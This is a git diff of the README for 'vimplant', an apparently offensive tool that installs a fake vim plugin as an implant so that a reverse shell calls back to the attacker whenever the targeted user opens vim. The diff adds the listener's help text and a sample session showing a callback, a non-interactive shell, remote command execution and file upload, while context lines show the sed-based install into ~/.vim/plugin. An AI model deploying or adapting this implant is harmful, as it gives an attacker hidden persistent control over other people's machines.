@@ -8,6 +8,18 @@ Minimal vim "plugin" for an implant to give a reverse shell.  Plugin is in quote
 
 ```
 python3 vimplant.py -p <CALLBACK_PORT>
+
+
+
+
+python3 vimplant.py -h
+usage: vimplant.py [-h] -p PORT
+
+Start listener for vimplant
+
+options:
+  -h, --help       show this help message and exit
+  -p, --port PORT  Port to listen for callbacks
 ```
 
 ## Install the "plugin" and set your callback host and port
@@ -23,11 +35,25 @@ sed -i 's:<CALLBACK_PORT>:LPORT:'> ~/.vim/plugin/vimplant.vim
 
 Callbacks will occur whenever the targeted user opens up vim.
 
+
+```
+python3 vimplant.py -p 4444
+[*] Waiting for connection on port 4444
+[+] Callback received from 127.0.0.1. Non-Interactive shell opened.
+>help
+vimplant help
+         exit - close the connection
+         put <local_file> <remote_destination> - upload a local file
+         !<local_command> - execute a local command
+```
+
 # Features
 
-Command execution.
+Remote command execution.
 
-Upload file.
+Local command execution by prepending `!` to your command.
+
+Upload files.
 
 # TODO
 
